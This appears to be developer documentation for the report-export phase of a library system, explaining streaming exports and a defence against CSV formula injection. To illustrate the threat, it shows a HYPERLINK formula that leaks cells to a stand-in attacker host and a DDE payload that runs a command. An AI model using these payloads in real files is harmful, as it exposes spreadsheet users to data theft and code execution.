# Phase 7 — Reports & Export

**Goal:** get data out of the system without buffering it — and without handing
the person who opens the file an attack.

---

## What we built

- `GET /api/reports/books/export` — the catalogue, CSV or JSON
- `GET /api/reports/members/export` — the membership roll, with optional
  per-member loan and fine aggregates
- `GET /api/reports/loans` — lending history, filtered by date, status, member
- `GET /api/reports/overdue` — what is late now, with projected fines
- `GET /api/reports/fines/summary` — aggregated totals, computed in SQL
- `CsvFieldEncoder` — formula-injection defence and type preservation, 21 tests
- `IReportExporter` with CSV and JSON implementations
- `ExportValue` — lets a row declare a column as text rather than a number

---

## Concepts

### 1. CSV formula injection — the security item

This is the one to understand. It is a genuine vulnerability, and the shape of it
is unusual.

**The attack.** A book is catalogued with this title:

```
=HYPERLINK("https://evil.example/?d="&A1&A2&A3,"Click for details")
```

Nothing is injected into *this* system. The title is stored faithfully, every
query is parameterised, and `GET /api/books/27` returns exactly what was sent.

The vulnerability is in the **export**. Excel, LibreOffice Calc and Google Sheets
treat a cell beginning `=`, `+`, `-` or `@` as a formula. So the file this
application writes becomes a working exfiltration link in the librarian's
spreadsheet, leaking neighbouring cells the moment it is clicked. Worse variants
reach DDE:

```
=cmd|'/c calc'!A0
```

which older Excel configurations execute after a prompt most users click through.

> **This application writes a file that another application executes.** A server
> that only defends its own process hands the attack to whoever opens the
> download.

**The fix.** A leading apostrophe forces the spreadsheet to treat the cell as
text:

```csharp
private static readonly char[] FormulaTriggers = ['=', '+', '-', '@'];
```

`-` is included because `-1+1` is arithmetic. `@` is Lotus-era syntax that Excel
still honours, and it is the one most commonly missed.

**Quoting is not a defence.** This is the subtlety:

```csharp
_encoder.Encode("=1+1,2").ShouldBe("\"'=1+1,2\"");     // apostrophe INSIDE
_encoder.Encode("=1+1,2").ShouldNotBe("\"=1+1,2\"");   // quoting alone is useless
```

Excel strips the surrounding quotes and then evaluates what is inside. RFC 4180
quoting is *structural* — it stops a comma breaking the file — and does nothing
about formulas. The apostrophe has to go inside.

**Leading control characters too.** Some parsers strip a leading tab or carriage
return *before* deciding whether a cell is a formula, so `"\t=1+1"` evaluates.
Both are treated as triggers.

**The cost, documented rather than hidden.** A legitimate title beginning with a
hyphen — `-40 Degrees` — shows a stray apostrophe in Excel. That is the accepted
trade: a cosmetic blemish on rare rows against arbitrary formula execution on the
rest. A test asserts it, so it is a decision rather than a surprise.

**JSON deliberately does not escape.**

```csharp
// JsonReportExporter — no encoder, and that is correct
```

A spreadsheet never opens JSON. Prefixing values with an apostrophe would corrupt
the data for every legitimate consumer. **A defence applied where the threat does
not exist is a bug**, not extra safety. Tests pin both behaviours, and the same
split applies to the ISBN fix below — one flag, acted on by CSV and ignored by
JSON.

---

### 2. Streaming out, as the import streams in

```csharp
IAsyncEnumerable<BookExportRow> StreamBooksAsync(...);   // repository
Task WriteAsync<T>(Stream destination, IAsyncEnumerable<T> rows, ...);   // exporter
```

`AsAsyncEnumerable()` rather than `ToListAsync()`: EF Core reads from the open
data reader as the consumer pulls, so the client starts downloading while the
database is still producing rows.

**This is the one place the "no `IQueryable` escapes the repository" rule bends**,
and it is worth being explicit about why. A report is unbounded by definition — a
200,000-row catalogue export materialised into a `List` allocates every row before
the first byte is sent. `IAsyncEnumerable` keeps the streaming without leaking
composability: a caller can enumerate it but cannot append a `Where` and change
the query. The abstraction that mattered is preserved; only the buffering is gone.

---

### 3. Why the controllers return `EmptyResult`

```csharp
Response.ContentType = descriptor.ContentType;
Response.Headers.ContentDisposition = $"attachment; filename=\"{descriptor.FileName}\"";
await write(Response.Body, cancellationToken);
return new EmptyResult();
```

A `FileResult` takes a completed byte array or stream — the whole report has to
exist before anything is sent, which defeats the point.

**The cost is stated in the controller**, because it is genuinely a trade:

> Headers must be set *before* the first byte is written — once the response has
> started, changing the status code is impossible, so an error mid-stream
> truncates the file rather than producing a clean 500.

That is right for a report and wrong for almost anything else. It also stopped
being theoretical within an hour — see below.

---

### 4. Aggregates belong in the database

```csharp
var totals = await query
    .GroupBy(_ => 1)
    .Select(g => new
    {
        Count = g.Count(),
        Assessed = g.Sum(f => f.Amount),
        Paid = g.Sum(f => f.PaidAt != null ? f.Amount : 0m),
        Outstanding = g.Sum(f => f.PaidAt == null && f.WaivedAt == null ? f.Amount : 0m),
        // ...
    })
    .FirstOrDefaultAsync(ct);
```

One round trip for every headline figure. Loading the fine rows and summing them
in C# returns the same answer and transfers the entire table to get it — the
difference between a report that works on seed data and one that works in
production. Six separate queries would be six round trips for one screen.

**Noted in passing:** `Fine` has no `AssessedAt`, so `CreatedAt` is the assessment
time. That holds only because a `Fine` row comes into existence when the handler
assesses it. If fines ever become creatable ahead of assessment, this filter
silently starts answering a different question — the comment in the repository
says so.

---

### 5. Date ranges are inclusive at both ends

```csharp
private static DateTimeOffset ToEndOfDay(DateOnly date) =>
    new(date.ToDateTime(TimeOnly.MaxValue), TimeSpan.Zero);
```

Using midnight for `to` silently excludes everything that happened on the final
day — the off-by-one that makes a month-end report miss the month's last day.

`asOf` on the overdue report gets the same treatment, so a loan due at 09:00 on
the 5th counts as overdue when asking about the 5th.

**An inverted range is refused**, not clamped:

```
from=2030-01-01&to=2000-01-01   →   422 report.invalid_date_range
```

Page numbers get clamped because there is a sensible value to clamp to. An
inverted range has none, and the empty report it would otherwise produce is
indistinguishable from "nothing happened in that period" — a real answer to a
question nobody asked.

---

### 6. Formatting: invariant culture, everywhere

```csharp
public static string Money(decimal value) => value.ToString("0.00", CultureInfo.InvariantCulture);
public static string Date(DateOnly? v) => v?.ToString("yyyy-MM-dd", CultureInfo.InvariantCulture) ?? "";
```

A report formatted in the server's culture is a file whose meaning depends on
where it was generated: `1,234.50` in one locale and `1.234,50` in another, both
written to a column someone's script parses as a number. And `03/04/2024` is
March in the US and April in the UK, with nothing in the file to say which.

No currency symbol, either — it would make the column non-numeric to every
consumer. Currency is a property of the whole report, not of each cell, and is
stated in the summary's `currency` field.

---

### 7. UTF-8 **with** a BOM

```csharp
private static readonly UTF8Encoding Utf8WithBom = new(encoderShouldEmitUTF8Identifier: true);
```

A BOM is unwanted in most modern contexts and required here. Excel on Windows
opens a BOM-less CSV as the system ANSI code page, so `José` arrives as `JosÃ©`.
The BOM is what tells Excel the file is UTF-8.

The trade: some strict parsers surface the BOM as stray characters on the first
header. These files are opened in a spreadsheet far more often than parsed by a
script, and mangled names are the worse failure.

---

### 8. A report whose columns depend on the request

The membership export is the one report that does not have a fixed shape. Three
flags add columns:

```
GET /api/reports/members/export?includeBookCounts=true
                              &includeActiveLoans=true
                              &includeFines=true
```

That breaks an assumption the other four rely on. Headers come from the row
**type**:

```csharp
static abstract IReadOnlyList<string> GetHeaders();
```

which is what lets an empty report still write a valid header line — there is no
row to ask. A request-dependent column set has no type to hang off.

**The failure mode to design against is silent.** If the header line lists eleven
columns and the rows emit ten, every value after the gap shifts one place left.
The file still parses. Nothing errors. A consumer reads `joinedOn` out of the
`status` column and carries on.

So both lists are generated from one object:

```csharp
public readonly record struct MemberExportColumns
{
    public bool BookCounts { get; init; }
    public bool ActiveLoans { get; init; }
    public bool Fines { get; init; }

    public IReadOnlyList<string> Headers() { ... }
}
```

`MemberExportColumns.Headers()` and `MemberExportRow.GetValues()` read the same
three flags in the same order, and the flags travel on the row itself, set once
from the request in the repository projection. They cannot disagree without
someone editing both.

`IReportExporter.WriteAsync` gained an optional `headers` parameter for this —
resolved from the request *before* the first row is read, so the empty-report
guarantee survives intact.

**The cost, stated in the OpenAPI description:** a consumer parsing this file
positionally must send the same flags every time. Reading by header name is the
safer habit and costs nothing.

---

### 9. Four aggregates, one query shape

`Member` has no `Loans` or `Fines` navigation property — deliberately, since a
member's loan history is unbounded and nothing in the domain needs to walk it. So
the aggregates are correlated subqueries:

```csharp
ActiveLoans = _context.Loans.Count(l => l.MemberId == m.Id && l.ReturnedAt == null),
```

with no collection to `Include` and no N+1 available to fall into. Both land on
indexes that already exist for other reasons — `IX_Loans_MemberId_ReturnedAt`
covers the loan counts, `IX_Fines_MemberId_PaidAt_WaivedAt` the fine totals.

**The query does not vary with the requested columns, and that is a choice.**
Making each aggregate conditional means either eight hand-written projections or
a `CASE WHEN @flag` the provider may evaluate anyway — complexity and a second
query shape to reason about, to avoid work the indexes above already make cheap.
All four are computed; the request decides which reach the file. The flags shape
the output, not the plan.

The case that would overturn it: a very large membership, exported often, with no
aggregates wanted. The fix then is to branch on *any* aggregate requested and skip
all four — one extra shape rather than eight. Recorded here so the reasoning can
be re-checked rather than rediscovered.

**One SQL detail worth knowing.** `SUM` over zero rows is `NULL`, not `0`, and
materialising that into a non-nullable `decimal` throws. Hence:

```csharp
.Sum(f => (decimal?)f.Amount) ?? 0m
```

A member who has never been fined is the common case, so this would have failed
on almost every row.

**Why two fine columns for one flag.** `totalFines` is lifetime assessed;
`outstandingFines` excludes what has been paid or waived. They answer different
questions — "has this member been fined before?" versus "does this member owe us
money?" — and only the second is actionable. Paying the seeded 800.00 fine leaves
`totalFines` at 800.00 and drops `outstandingFines` to 0.00, which is the whole
point of carrying both.

---

## Things that bit us

### `EF.Functions.DateDiffDay` is SQL Server only — and it failed *mid-stream*

The first version computed overdue days in SQL:

```csharp
DaysOverdue = EF.Functions.DateDiffDay(l.DueAt, asOf)   // SQL Server only
```

The SQLite provider cannot translate it. The query silently switched to client
evaluation and then threw — **after the first row had already been written to the
response.**

The symptom was a loans export containing a header and one row, with `HTTP 200`
and no error visible to the client at all. The file was simply short. Only the
server log showed:

```
System.InvalidOperationException: The 'DateDiffDay' method is not supported
because the query has switched to client-evaluation.
```

This is exactly the failure the dual-provider rule exists to catch: **code that
works on one database and not the other.** And it demonstrated the streaming
trade-off documented in the controller within an hour of that comment being
written — a mid-stream error truncates rather than failing cleanly.

**The fix.** Date *comparisons* translate on both providers; only the arithmetic
did not. `DaysOverdue` and `ProjectedFine` became computed properties on the
export rows, derived from the dates and the `asOf` instant:

```csharp
public int DaysOverdue
{
    get
    {
        DateTimeOffset endpoint = ReturnedAt ?? AsOf;
        return endpoint <= DueAt ? 0 : (int)(endpoint.Date - DueAt.Date).TotalDays;
    }
}
```

O(1) per row, streaming intact, nothing provider-specific left in the query.
After the fix the loans export returned all 5 rows instead of 1.

**The lesson:** an `IQueryable` that compiles is not an `IQueryable` that
translates, and the failure can arrive after the response has started.

### Every exported ISBN read as `9.78E+12`

Found by opening the catalogue export in Excel, which is the only place it is
visible. The CSV was never wrong:

```
2,9780132350884,Clean Code,...
```

Thirteen digits, exactly as stored. But **a CSV carries no types**, so the
spreadsheet infers one per cell from the characters alone — and thirteen digits
is a number. Excel converted it, found it too wide for the column, and displayed
`9.78E+12`. Every script parsing the file got the right answer; the librarian who
opened the download could not read a single ISBN.

Three things about this are worth keeping:

**The obvious fix does not work.** Quoting the field — `"9780132350884"` — changes
nothing. RFC 4180 quotes describe the *file's structure*, not a cell's type, and
Excel discards them before inferring. The only in-band signal a spreadsheet
honours is a leading apostrophe, which is the same mechanism already carrying the
formula defence, now doing a second job.

**The encoder cannot decide this on its own.** By the time a value reaches
`CsvFieldEncoder` it is a string, and `9780132350884` and `212` are equally
strings. Guessing from length — "twelve digits or more must be an identifier" —
is a rule that works until a genuine total crosses the threshold and silently
acquires an apostrophe. So the *row* declares the column instead:

```csharp
ExportFormatting.Text(Isbn),    // an identifier
ExportFormatting.Number(Id),    // a quantity
```

`ExportValue` carries that flag, with an implicit conversion from `string` so
only the exceptional columns say anything. The encoder then acts on the
declaration, and only where it changes something: `LIB-001000` is declared text
and left untouched, because no spreadsheet would read it as a number and an
apostrophe there would be visible noise for no gain.

**The round trip still works.** An exported catalogue is meant to import straight
back, so the prefix would be a real regression if it survived the trip.
`Isbn.Normalize` keeps only ASCII digits and discards everything else — the
apostrophe included — which a test now pins rather than assumes.

**JSON was never affected and still is not.** `Utf8JsonWriter.WriteString` emits
every value as a JSON string, so the ambiguity does not exist there. Both
exporters receive the same `IsText` flag and only one acts on it — the same
reasoning that keeps the formula defence out of the JSON path: a defence applied
where the threat does not exist is a bug.

The same fix covers `memberPhone`, and that one matters more: a ten-digit number
rendered as `9.88E+09` cannot be dialled, in the two reports whose entire purpose
is contacting people.

### A test assertion that was too strict

`A_leading_control_character_before_a_trigger_is_also_neutralised` asserted the
encoded value starts with `'`. It fails for `"\r=1+1"` — the carriage return
triggers RFC 4180 quoting, so the result is `"'\r=1+1"` and starts with a quote.

Both cases are correctly disarmed; the apostrophe is simply inside the quotes,
which is where it belongs. The test now checks the first character ignoring an
opening quote, and says why.

---

## SOLID in this phase

| Principle | Where |
|---|---|
| **S** | `CsvFieldEncoder` does one thing. It knows nothing about books, loans, or streams |
| **O** | `ReportExporterFactory` indexes exporters by format — the same shape as the import readers |
| **L** | **The clearest example in the codebase.** Both exporters honour the same contract: consume the sequence once, write to the stream, never buffer, never dispose. A caller swaps CSV for JSON by changing an enum — *including* the streaming guarantee, which an implementation that quietly buffered would violate while still compiling |
| **I** | `IExportableRow` has two members. The exporters never learn what a book is |
| **D** | `Library.Application` declares the exporter interfaces; `Utf8JsonWriter` and the CSV writing live in Infrastructure |

---

## Verification

```bash
# Catalogue a book whose title is a formula, then export
curl "http://localhost:5112/api/reports/books/export" -o books.csv
grep HYPERLINK books.csv
```

```
27,9780306406157,"'=HYPERLINK(""https://evil.example/?d=""&A1,""Click me"")",...
```

Apostrophe inside the quotes; quotes doubled per RFC 4180. The same book via
`?format=Json` is untouched, and `GET /api/books/27` still returns the original
string — **escaped at the boundary where the threat exists, not corrupted at
rest.**

| Check | Result |
|---|---|
| `GET /api/reports/loans` | 5 rows, statuses `Active`/`Overdue`/`Returned` |
| `GET /api/reports/overdue` | 2 rows — 61 and 16 days late |
| Projected fines | `3050.00` and `800.00` — 61 × 50 and 16 × 50 |
| `?asOf=2026-08-01` | 1 row · `?asOf=2027-06-01` → 3 rows |
| Return the 16-day loan | Fine of `800.00` assessed |
| `GET /api/reports/fines/summary` | `totalAssessed=800`, `outstanding=800`, monthly breakdown |
| `from=2030&to=2000` | `422 report.invalid_date_range` |
| `Content-Disposition` | `attachment; filename="overdue-2026-09-14.csv"` |

### ISBN as text

```bash
curl "http://localhost:5112/api/reports/books/export" | head -2
```

```
id,isbn,title,...
15,'9780553380163,A Brief History of Time,...
```

| Check | Result |
|---|---|
| `isbn` in CSV | `'9780553380163` — reads as text, digits intact |
| `id`, `pageCount`, `totalCopies` | `15`, `212`, `3` — untouched, still numbers |
| Same row via `?format=Json` | `"isbn":"9780553380163"` — no apostrophe |
| `barcode`, `membershipNumber` | `LIB-001040`, `MEM-2022-00003` — declared text, not prefixed |
| `memberPhone` | `'+919988776655` |
| Empty `phone` | empty cell, not a lone `'` |

### Membership export

```bash
curl "http://localhost:5112/api/reports/members/export\
?includeBookCounts=true&includeActiveLoans=true&includeFines=true"
```

| Check | Result |
|---|---|
| No flags | 10 columns, 9 members, ordered by name |
| All three flags | 14 columns — `booksBorrowed`, `activeLoans`, `totalFines`, `outstandingFines` |
| `includeActiveLoans` alone | 11 columns; the other aggregates absent, not zeroed |
| Loan totals | 2 + 1 + 2 = 5 loans, 3 active — matches the loans report |
| Return the 16-day loan | Arjun Mehta: `activeLoans` 1 → 0, `totalFines` 0.00 → 800.00 |
| Pay that fine | `totalFines` 800.00, `outstandingFines` 800.00 → **0.00** |
| `?status=Suspended` | 1 row (Kabir Singh) · `?status=Nonsense` → `400` |
| `?membershipTypeId=2` | 2 rows, both `Student` |
| `?membershipTypeId=999` | **Header line only** — an empty report is still a valid file |

---

## Questions you should be able to answer

1. What is CSV formula injection, and why is it a vulnerability in *this* system
   when nothing is injected into this system?
2. Why does the apostrophe go inside the RFC 4180 quotes rather than outside?
3. Why does the JSON exporter deliberately *not* escape?
4. Why do the export controllers return `EmptyResult` rather than `FileResult`,
   and what does that cost?
5. Why does the repository return `IAsyncEnumerable` when the rule says
   `IQueryable` never escapes?
6. Why did `DateDiffDay` produce a truncated file with a 200 status rather than
   an error?
7. Why is `to` converted to the end of the day rather than midnight?
8. Why is an inverted date range refused when an out-of-range page number is
   clamped?
9. Why is the CSV written with a BOM when a BOM is usually unwanted?
10. Why did quoting the ISBN field not stop Excel converting it to `9.78E+12`,
    and what does?
11. Why does the *row* declare a column as text rather than the encoder detecting
    it? What breaks if the encoder guesses from the value's length?
12. Why is `LIB-001000` declared a text column and yet left unprefixed?
13. Why does the apostrophe not break the export → import round trip?
14. The membership export's columns depend on the request. What is the silent
    failure that design has to prevent, and how does `MemberExportColumns`
    prevent it?
15. Why are the member aggregates computed even when the request does not ask for
    them — and what would change that decision?
16. Why is `Sum` cast to `decimal?` before the null-coalesce?

---

## What remains

- No integration test covers an export endpoint. Everything above was verified by
  hand — see the Testing section of the README for the full, deliberate gap.
- Phase 8 revisits the export surface: these endpoints are unauthenticated, and
  the overdue report carries member email addresses and phone numbers.
